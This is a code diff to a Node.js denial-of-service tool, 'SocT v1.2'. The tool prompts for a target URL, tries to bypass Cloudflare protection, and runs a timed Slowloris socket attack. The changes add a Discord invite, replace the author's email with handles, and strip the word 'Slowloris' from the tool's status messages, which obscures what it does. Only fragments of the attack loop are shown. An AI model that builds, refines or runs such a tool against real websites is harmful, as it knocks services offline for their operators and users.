@@ -9,6 +9,8 @@ const rl = readline.createInterface({
     output: process.stdout
 });
 
+console.log("discord >> https://discord.gg/JD9K97MJKx")
+console.log("");
 console.log("[?] Put (https://) or (http://) first.");
 console.log("");
 rl.question('.!URL > ', async (url) => {
@@ -80,7 +82,7 @@ rl.question('.!URL > ', async (url) => {
         await page.goto(targetUrl, { waitUntil: 'networkidle2' });
         await bypassCloudflare(page);
 
-        console.log("SocT v1.2 by vzexg-2 <sunshinej1x@omail.edu.pl>");
+        console.log("SocT v1.2 by vzexg-2 / sxc_qq1");
         console.log("");
         const timerId = setInterval(() => {
             if (Date.now() < endTime) {
@@ -139,12 +141,12 @@ rl.question('.!URL > ', async (url) => {
                     });
 
                     socket.on('error', (error) => {
-                        console.log("\x1b[31m[!] Slowloris attack failed. Reason:", error.message);
+                        console.log("\x1b[31m[!] attack failed. Reason:", error.message);
                     });
                 }
             } else {
                 clearInterval(timerId);
-                console.log("Slowloris attack finished. Time limit reached.");
+                console.log("attack finished. Time limit reached.");
                 rl.close();
             }
         }, 100);
